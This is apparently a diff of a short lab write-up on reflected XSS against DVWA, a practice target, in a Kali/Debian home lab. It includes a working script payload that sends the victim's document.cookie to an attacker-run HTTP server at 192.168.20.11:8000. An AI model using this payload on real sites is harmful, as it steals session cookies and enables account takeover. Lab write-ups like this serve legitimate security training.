@@ -1,6 +1,3 @@
-**File 1: `xss_reflected.md`**
-
-````markdown
 # XSS Reflected - DVWA
 
 **Environment:**  
@@ -15,16 +12,13 @@
 1. On Kali, start a simple HTTP server on port 8000:
    ```bash
    python3 -m http.server 8000
-````
 
 2. On Debian (victim), enter the following payload in DVWA XSS (Reflected) module:
 
    ```html
    <script>new Image().src="http://192.168.20.11:8000/?cookie="+document.cookie;</script>
-   ```
 3. Submit the form.
 
----
 
 ## Result
 
@@ -39,4 +33,5 @@ On Kali, the HTTP server logs the captured cookie:
 * The payload executes immediately when the victim interacts with the malicious input.
 * Cookies and session tokens can be captured by the attacker.
 * Reflected XSS requires victim interaction (clicking a link or submitting a form).
+
 
